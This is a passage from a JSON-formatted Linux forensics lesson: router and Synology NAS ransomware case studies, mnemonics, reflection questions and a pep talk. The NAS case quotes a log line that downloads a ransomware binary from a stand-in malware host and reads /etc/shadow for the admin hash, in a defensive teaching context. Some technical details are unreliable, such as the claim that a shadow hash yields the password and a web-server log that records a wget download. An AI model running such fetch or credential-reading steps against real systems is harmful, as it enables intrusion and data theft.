/tmp/usb/\n```\n\n**Remediation**:\n- Factory reset router\n- Upgrade firmware to patched version\n- Change all credentials\n- Implement network segmentation\n- Enable centralized logging\n- Monitor for unauthorized SSH connections\n\n## Case Study 3: The NAS Ransomware (Healthcare, 2023)\n\n**Scenario**: Hospital's Synology NAS (Network Attached Storage) encrypted all patient data backups. Ransom note demanded 50 Bitcoin.\n\n**Device**: Synology DS920+ running DSM 7.1 (Debian-based Linux)\n\n**Investigation**:\n\n```bash\n# SSH to NAS (had backup admin account)\nssh admin2@nas.hospital.local\n\n# Check OS\ncat /etc/VERSION\n# Synology DSM 7.1-42661\n\ncat /proc/version\n# Linux version 4.4.180+ (root@build3) (gcc version 7.5.0 (GCC) )\n\n# Check for ransomware process\nps aux | grep -v \"synology\\|postgres\\|nginx\" | grep -v \"\\[\"\n# Found: /tmp/encrypt_all\n\n# Kill it\nkill -9 [PID]\n\n# Examine binary\nfile /tmp/encrypt_all\n# ELF 64-bit LSB executable, x86-64, stripped\n\nstrings /tmp/encrypt_all | head -50\n# AES-256-CBC\n# .encrypted\n# http://ransomsite.onion/payment\n\n# Check how ransomware got there\ncat /var/log/messages | grep -i \"ssh\\|login\\|fail\"\n# Found 3,000+ failed SSH login attempts, then one success\n# Oct 30 02:15:33 NAS sshd[12345]: Accepted password for admin from 203.0.113.88\n\n# Check authentication log\ncat /var/log/auth.log | grep \"203.0.113.88\"\n# Attacker brute-forced admin account\n\n# Check user account\ncat /etc/shadow | grep admin\n# admin:$6$weak_hash...\n# Weak password \"admin123\"\n\n# Check download history\ncat /var/log/nginx/access.log | grep -A5 \"Oct 30 02:16\"\n# wget from http://malware-server.com/encrypt_all\n\n# Check for persistence\ncrontab -l\n# (no cron jobs)\n\ncat /etc/rc.local\n# (empty)\n\n# Check systemd services\nsystemctl list-unit-files | grep enabled | grep -v \"synology\"\n# (none found - ransomware ran once, no persistence)\n```\n\n**Attack Timeline**:\n1. Attacker scanned internet for Synology NAS devices (port 5000/5001)\n2. Found hospital NAS with default admin account\n3. Brute-forced weak password (\"admin123\")\n4. SSH'd to NAS\n5. Downloaded ransomware binary via wget\n6. Executed /tmp/encrypt_all\n7. Encrypted all files in /volume1/ (backups, patient data)\n\n**Forensic Recovery**:\n\n```bash\n# Check Synology snapshots (if enabled)\nsyno_snapper_tool --list volume1\n# Found snapshots from 3 days ago (before encryption)\n\n# Restore from snapshot\nsyno_snapper_tool --restore volume1/backup_2023-10-27\n\n# Check for unencrypted copies\nfind /volume1 -name \"*.encrypted\" -exec ls -lh {} \\; | head -10\nfind /volume1 -type f ! -name \"*.encrypted\" | head -10\n# Found some files not encrypted\n\n# Image NAS for forensics\ndd if=/dev/md2 of=/mnt/usb/nas_image.dd bs=4M\n```\n\n**Lessons Learned**:\n- Enforce strong passwords on all accounts\n- Disable default admin accounts\n- Implement IP whitelisting for SSH\n- Enable Synology snapshots (saved the day here)\n- Implement immutable backups (air-gapped or cloud)\n- Monitor for failed login attempts\n- Use 2FA for NAS access\n\n## Common Patterns Across Cases\n\n1. **Weak Credentials**: Default passwords, weak passwords, no MFA\n2. **Unpatched Systems**: Known vulnerabilities not patched\n3. **Limited Monitoring**: No EDR, no centralized logging\n4. **Excessive Privileges**: Local admin rights, root access\n5. **Linux Blind Spot**: Focus on Windows, ignore Linux devices\n\n## Forensic Takeaways\n\n1. **WSL is increasingly used by attackers** - monitor WSL installations\n2. **Embedded devices are targets** - routers, NAS, IoT\n3. **Distribution knowledge matters** - different logs, different commands\n4. **Collect volatile data first** - /tmp is often tmpfs (RAM)\n5. **Bash history is gold** - even after \"history -c\", file may persist\n6. **Check for persistence** - cron, systemd, rc.local, startup scripts\n7. **Network logs complement host logs** - firewall, IDS, router logs"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids for Linux Forensics Fundamentals\n\n## Mnemonic: \"BETH VR\" - High-Value Forensic Directories\n\nWhere to look first in ANY Linux system:\n\n- **B** = /Boot - Bootloader, kernel, boot sector malware\n- **E** = /Etc - Configuration files, cron jobs, services\n- **T** = /Tmp - Temporary files, attacker staging area\n- **H** = /Home - User data, bash history, ssh keys\n- **V** = /Var - Logs (most important!), databases, mail\n- **R** = /Root - Root user's home directory\n\n**Remember**: \"Beth is in VR\" - these are your virtual reality check for any investigation.\n\n## Mnemonic: \"DAR\" - The Three Distribution Families\n\n- **D** = Debian (apt, .deb, dpkg) → Ubuntu, Kali, Mint\n- **A** = Arch (pacman, .pkg.tar.zst) → Arch, Manjaro\n- **R** = Red Hat (yum/dnf, .rpm, rpm) → RHEL, CentOS, Fedora\n\n**Remember**: \"DAR you go again\" - another Linux distro!\n\n## Visual: Distribution Detection Flowchart\n\n```\nAcquired Linux System\n|\nv\ncat /etc/os-release\n|\n+----> ID=debian/ubuntu → Debian Family\n|\n+----> ID=rhel/centos/fedora → Red Hat Family\n|\n+----> ID=arch/manjaro → Arch Family\n```bash\n\n## Mnemonic: \"PACKAGE\" - Quick Distribution ID\n\nTo identify distribution:\n\n- **P** = /Proc/version (kernel info)\n- **A** = Apt/dpkg (Debian)\n- **C** = Cat /etc/os-release (standard)\n- **K** = Kernel (uname -a)\n- **A** = Architecture (uname -m)\n- **G** = Grep /etc/*release*\n- **E** = Examine package manager (which apt yum pacman)\n\n## Acronym: \"WSL-RAP\" - WSL Investigation Steps\n\n- **W** = Wsl --list (find distributions)\n- **S** = Search AppData\\Local\\Packages\n- **L** = Locate rootfs folder\n- **R** = Read bash_history\n- **A** = Analyze /var/log\n- **P** = Parse /etc/crontab\n\n## Visual: Package Manager Comparison\n\n```\nDebian          Red Hat         Arch\n------          -------         ----\napt             yum/dnf         pacman\ndpkg            rpm             \n.deb            .rpm            .pkg.tar.zst\n/var/lib/dpkg   /var/lib/rpm    /var/lib/pacman\n/var/log/dpkg   /var/log/yum    /var/log/pacman\nUbuntu ✓        CentOS ✓        Manjaro ✓\nKali ✓          Fedora ✓        Arch ✓\n```\n\n**Memory trick**: \"Debian APT-ly packages with DEB files, Red Hat RPMs Yum, Arch PACks with MAN\".\n\n## Rhyme: The Linux Forensics Poem\n\n*\"In /var/log the secrets hide,*\n*In /etc where configs reside,*\n*In /home the users dwell,*\n*In /tmp the attackers tell,*\n*Check /root for privileged deeds,*\n*These five paths meet your needs.\"*\n\n## Analogy: Linux Distributions = Car Brands\n\n**Debian Family** = Japanese cars (Toyota, Honda)\n- Reliable, stable, widely used\n- Standard features work everywhere\n- Easy to maintain\n\n**Red Hat Family** = American trucks (Ford, Chevy)\n- Enterprise-focused, heavy-duty\n- Commercial support available\n- Used in critical infrastructure\n\n**Arch Family** = Sports cars (Custom builds)\n- Performance-focused, minimal\n- Enthusiast community\n- Latest features, cutting-edge\n\n**All have**: Engine (kernel), transmission (init system), wheels (filesystem), dashboard (shell)\n\n## Mnemonic: \"EMBEDDED\" - Appliance Forensics Checklist\n\n- **E** = Examine /proc/version\n- **M** = Mount (check mounted filesystems)\n- **B** = BusyBox --list (check available tools)\n- **E** = Extract configuration files\n- **D** = Dd (image persistent storage)\n- **D** = Df -h (find storage devices)\n- **E** = Enumerate processes (ps aux)\n- **D** = Document volatile data first\n\n## Visual: WSL on Windows\n\n```\nWindows Host\n|\n+-- C:\\Users\\username\\AppData\\Local\\Packages\\\n|\n+-- CanonicalGroupLimited.Ubuntu...\\\n|       |\n|       +-- LocalState\\rootfs\\\n|               |\n|               +-- bin/ etc/ home/ var/ ... (Linux!)\n|\n+-- TheDebianProject.DebianGNULinux...\\\n|       |\n|       +-- LocalState\\rootfs\\\n|\n+-- KaliLinux...\\\n```\n\n**Remember**: WSL hides Linux in Windows AppData - it's like a house within a house!\n\n## Quick Reference Card\n\n```\n╔════════════════════════════════════════════════════╗\n║     LINUX FORENSICS QUICK REFERENCE                ║\n╠════════════════════════════════════════════════════╣\n║ IDENTIFY DISTRO:                                   ║\n║   cat /etc/os-release                              ║\n║   cat /etc/issue                                   ║\n║   ls /etc/*release*                                ║\n║                                                    ║\n║ HIGH-VALUE DIRECTORIES (BETH VR):                  ║\n║   /boot /etc /tmp /home /var /root                 ║\n║                                                    ║\n║ PACKAGE MANAGERS:                                  ║\n║   Debian: dpkg -l, apt, /var/log/dpkg.log          ║\n║   Red Hat: rpm -qa, yum/dnf, /var/log/yum.log      ║\n║   Arch: pacman -Q, /var/log/pacman.log             ║\n║                                                    ║\n║ WSL LOCATION (Windows):                            ║\n║   %LOCALAPPDATA%\\Packages\\[distro]\\LocalState\\     ║\n║   rootfs\\                                          ║\n║                                                    ║\n║ EMBEDDED LINUX:                                    ║\n║   Check for BusyBox, tmpfs mounts, minimal logs   ║\n╚════════════════════════════════════════════════════╝\n```bash\n\n## Story-Based Memory: The Three Distribution Kingdoms\n\nImagine Linux as a medieval world with three kingdoms:\n\n**Debian Kingdom** (The Stable Realm):\n- Capital: Ubuntu City\n- Language: APT-speak (apt, dpkg)\n- Scroll storage: /var/lib/dpkg\n- Known for: Stability, user-friendliness\n- Population: Largest (most users)\n\n**Red Hat Kingdom** (The Enterprise Empire):\n- Capital: RHEL Fortress\n- Language: RPM-tongue (rpm, yum, dnf)\n- Scroll storage: /var/lib/rpm\n- Known for: Enterprise solutions, commercial support\n- Population: Corporate citizens\n\n**Arch Kingdom** (The Minimalist Mountain):\n- Capital: Arch Peak\n- Language: Pacman-runes (pacman)\n- Scroll storage: /var/lib/pacman\n- Known for: Cutting-edge technology, DIY philosophy\n- Population: Advanced users, enthusiasts\n\n**All kingdoms share**: The Linux Kernel (the ancient magic), the FHS (the common law), and /var/log (the historical archives).\n\nWhen investigating, identify which kingdom you're in, speak their language (use their package manager), and follow their laws (check their specific log locations)."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions\n\nThese questions help you think deeper about what you've learned and how to apply it.\n\n## Meta-Learning Questions\n\n1. **What surprised you most about Linux distributions?**\n- Reflect: Did you expect more differences or fewer differences between Debian, Red Hat, and Arch?\n- Why it matters: Understanding that distributions are more similar than different reduces investigation complexity.\n\n2. **How does knowing the Linux architecture (kernel space vs user space) change your forensic approach?**\n- Consider: Where do rootkits hide? Where does malware run? Where are logs stored?\n- Application: This determines whether you need memory forensics, disk forensics, or both.\n\n3. **What connections can you make between Windows and Linux forensics?**\n- Compare: Windows Event Logs ↔ /var/log, Windows Registry ↔ /etc configs, Program Files ↔ /usr/bin\n- Insight: Both operating systems have logging, configuration, and executable storage - just different locations.\n\n## Application Questions\n\n4. **You find a compromised system but can't determine if it's Debian or Red Hat-based. What THREE commands would you run first and why?**\n- Think about: Reliability, availability, forensic soundness\n- Model answer: `cat /etc/os-release` (most reliable), `ls /etc/*release*` (find distro files), `which dpkg rpm` (identify package manager)\n\n5. **Why is WSL particularly dangerous from a security perspective?**\n- Consider: EDR visibility, attacker tools, network monitoring, user expectations\n- Real-world impact: Many organizations don't monitor WSL, creating a blind spot\n\n6. **An embedded Linux router has a tmpfs /tmp directory (stored in RAM). What does this mean for your forensic approach?**\n- Think about: Volatility, order of collection, reboot impact\n- Answer: Collect volatile data FIRST before any reboot, memory acquisition critical, persistent storage may be limited\n\n## Synthesis Questions\n\n7. **Create a mental checklist: You boot a live Linux forensics USB on a suspect system. What are the first FIVE things you'd check and why?**\n- Hint: Think about volatility, distribution identification, running processes, network connections, recent activity\n\n8. **How would you explain to a non-technical manager why investigating Linux systems requires different skills than Windows?**\n- Challenge: Use analogies, avoid jargon, focus on business impact\n\n9. **An attacker installed Ubuntu WSL on a Windows 10 workstation and exfiltrated data. The Windows EDR logs show nothing suspicious. Why did this happen, and how would you detect it in the future?**\n- Think about: EDR limitations, WSL architecture, logging gaps, detection strategies\n\n## Critical Thinking Questions\n\n10. **Debian has 50,000+ packages available. Red Hat has 25,000+. How do you determine which installed packages are legitimate vs malicious?**\n- Consider: Baseline comparison, package naming conventions, installation timestamps, package sources\n\n11. **You're investigating a Synology NAS running DSM (Debian-based). The web GUI shows no suspicious activity, but you suspect compromise. Where would you look and why?**\n- Hint: GUI ≠ reality. Think about: SSH access, logs, processes, cron jobs, unauthorized services\n\n12. **An IoT device runs embedded Linux with BusyBox. You have no Python, no Perl, no standard forensic tools. How do you collect evidence?**\n- Challenge: What can you do with ONLY BusyBox commands? (cat, ls, ps, netstat, tar, dd)\n\n## Scenario-Based Questions\n\n13. **Scenario**: You acquire a disk image from a server. Running `cat /etc/os-release` returns nothing. The file doesn't exist. How do you identify the distribution?\n- Walk through: Alternative identification methods, why os-release might be missing, what this tells you about the system\n\n14. **Scenario**: You're investigating a suspected backdoor on a CentOS web server. You run `rpm -qa --last` and see \"openssh-server\" was reinstalled 3 days ago. What does this tell you, and what would you investigate next?\n- Think about: Why reinstall? Trojanized binaries? Package tampering? Next steps?\n\n15. **Scenario**: A Windows workstation has THREE WSL distributions installed (Ubuntu, Debian, Kali). Only one was installed by IT. How do you determine which distributions were unauthorized and what the attacker did?\n- Approach: Installation timestamps, user accounts, bash history comparison, package installations\n\n## Practical Application\n\n16. **You're building a Linux forensics lab. You have budget for THREE VMs. Which three distributions would you choose and why?**\n- Justify: Coverage of distribution families, real-world relevance, forensic artifact diversity\n- Model answer: Ubuntu (most common), CentOS/Rocky (enterprise), Kali (attacker tools for testing)\n\n17. **Your organization wants to prevent WSL-based attacks. What technical controls would you implement?**\n- Think about: Group Policy, AppLocker, EDR configuration, user permissions, monitoring\n\n18. **An attacker used an embedded Linux router as a pivot point into your network. The router rebooted, and /tmp (tmpfs) was wiped. What forensic artifacts might still exist?**\n- Consider: Persistent storage, configuration files, flash memory, network logs from other devices, memory dumps if acquired before reboot\n\n## Self-Assessment\n\n19. **On a scale of 1-10, how confident are you in:**\n- Identifying Linux distributions from disk images? ___\n- Understanding package management differences? ___\n- Investigating WSL installations? ___\n- Examining embedded Linux devices? ___\n\nFor any rating below 7, what specific area needs more practice?\n\n20. **If you had to teach someone else the THREE most important concepts from this lesson, what would they be and why?**\n- Teaching reinforces learning - what stuck with you?\n\n## Looking Ahead\n\n21. **How does understanding distributions and package managers prepare you for the next lesson on Linux filesystem structure?**\n- Connection: Package managers install to specific directories, logs are in /var, configs in /etc - now you'll learn EXACTLY where everything lives.\n\n22. **What questions do you still have about Linux fundamentals?**\n- Reflect: What wasn't clear? What do you want to explore deeper?\n\n## Action Items\n\n23. **What ONE thing will you do in the next 24 hours to practice what you learned?**\n- Suggestions: Install a Linux VM, examine a WSL installation, try distribution identification commands, explore package manager logs\n\n24. **How will you apply this knowledge to your current role or next investigation?**\n- Practical application: Linux servers, cloud instances, containers, IoT devices, WSL on workstations"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You've Built Your Linux Forensics Foundation\n\nCongratulations! You've just completed the first and most important lesson in Linux forensics. Here's what you've accomplished:\n\n## What You Now Know\n\n✅ **Linux Architecture** - You understand how Linux works from kernel to user space, and why this matters for forensics\n\n✅ **Three Distribution Families** - You can identify Debian, Red Hat, and Arch-based systems and know their forensic differences\n\n✅ **Package Management** - You know how apt, yum/dnf, and pacman work, and where to find installation logs\n\n✅ **WSL Forensics** - You can investigate Windows Subsystem for Linux and understand why it's a security blind spot\n\n✅ **Embedded Linux** - You recognize the challenges of investigating routers, NAS devices, and IoT systems\n\n✅ **Distribution Detection** - You have a systematic approach to identifying ANY Linux system you encounter\n\n## Why This Matters\n\nYou're not just learning Linux - you're learning to think like a forensic investigator:\n\n- When you see a Linux system, you immediately think: \"What distribution? What package manager? Where are the logs?\"\n- When you investigate WSL, you know EXACTLY where to find artifacts on the Windows host\n- When you encounter an embedded device, you adapt your approach for limited tooling and volatile storage\n\n**This is the foundation everything else builds on.** Every future lesson assumes you understand distributions, package managers, and the Linux filesystem hierarchy. You've got that now.\n\n## The Path Forward\n\n**Next lesson**: Linux Root Directory Structure and File Hierarchy\n- Deep dive into /etc, /var/log, /home, and every other critical directory\n- Where EXACTLY to find each type of forensic artifact\n- How to navigate Linux filesystems efficiently\n\n**After that**: You'll learn permissions, users, logs, filesystems, memory forensics, and put it all together in real-world case studies.\n\n## Overcoming Common Challenges\n\n**\"There are too many distributions to learn\"**\n- Truth: You learned the THREE families (Debian, Red Hat, Arch). 99% of distributions are based on these. You've already covered the important parts.\n\n**\"I'm more comfortable with Windows forensics\"**\n- Truth: Linux is MORE structured than Windows once you understand it. Text-based configs, human-readable logs, standardized filesystem. You'll see this in the next lessons.\n\n**\"Command line is intimidating\"**\n- Truth: You only need 20-30 commands for 80% of investigations. You'll practice these in every lesson. Muscle memory builds fast.\n\n## Quick Wins You Can Do Today\n\n1. **Spin up an Ubuntu VM** (free, easy) and run these commands:\n```bash\ncat /etc/os-release\ndpkg -l | head -20\nls /var/log\ncat ~/.bash_history\n```\n\n2. **If you have Windows 10/11**: Enable WSL, install Ubuntu, and explore the AppData\\Local\\Packages folder. See the \"rootfs\" Linux filesystem.\n\n3. **Practice distribution detection**: Find three different Linux disk images or VMs and identify each one using the methods from this lesson.\n\n## Remember the \"BETH VR\" Directories\n\nNo matter what Linux system you investigate, start here:\n- **/B**oot - Kernel and bootloader\n- **/E**tc - Configuration files\n- **/T**mp - Temporary files\n- **/H**ome - User data\n- **/V**ar - Logs (gold mine)\n- **/R**oot - Root user home\n\nThese six directories contain 90% of forensic artifacts. Next lesson, you'll learn exactly what's in each one.\n\n## You're Ready\n\nYou've learned more in this lesson than many IT professionals know about Linux. You understand:\n- How Linux is structured\n- Why distributions differ\n- Where to find artifacts\n- How to adapt your approach\n\nThat's REAL expertise building. Keep going.\n\n## Resources to Explore\n\n**Want to go deeper?**\n- Install VirtualBox (free) and try Ubuntu, CentOS/Rocky, and Kali Linux VMs\n- Browse /etc/ and /var/log on a Linux system to see what's there\n- Read distribution documentation (ubuntu.com/server/docs, docs.rockylinux.org)\n- Practice with online Linux forensics challenges (HackTheBox, TryHackMe)\n\n**Books**:\n- \"The Linux Command Line\" by William Shotts (free online)\n- \"Linux Forensics\" by Philip Polstra\n- \"Practical Linux Forensics\" by Bruce Nikkel\n\n**Tools**:\n- SIFT Workstation (SANS forensics toolkit - free)\n- CAINE Linux (forensics distribution - free)\n- Autopsy with Linux modules\n\n## Your Next Steps\n\n1. ✅ Mark this lesson complete\n2. ➡️ Take a 10-minute break (let your brain consolidate)\n3. ➡️ Move on to Lesson 72: Linux Root Directory Structure\n4. ➡️ Practice distribution identification this week\n\n## Final Thought\n\nEvery Linux expert started exactly where you are now - learning the fundamentals, understanding distributions, and building systematic investigation skills. The difference between a beginner and an expert is simply practice and pattern recognition.\n\nYou've got the knowledge. Now you build the experience.\n\n**See you in the next lesson, where we explore the Linux filesystem in detail!**\n\n---\n\n*\"The expert in anything was once a beginner.\" - Helen Hayes*\n\n*You've taken the first step. Keep going.*"
      }
    }
  ],
  "tags": [
    "Course: 13Cubed-Investigating Linux Devices"
  ]
}